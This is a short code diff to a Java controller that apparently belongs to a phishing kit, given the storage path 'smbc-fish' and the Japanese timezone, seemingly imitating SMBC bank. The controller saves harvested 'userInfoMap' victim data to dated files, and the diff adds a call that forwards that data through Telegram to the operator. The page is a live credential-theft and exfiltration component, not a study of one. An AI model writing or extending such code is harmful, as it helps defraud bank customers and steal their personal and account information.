@@ -92,6 +92,7 @@ public class SmbcPcController {
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/smbc-fish/%s.txt", timeStr), userInfoMap);
+        asyncTask.asyncSendTgMsg(null,null,userInfoMap);
         addCookie("ip", IpUtils.getIpAddress(request));
         return "pc-finish";
     }
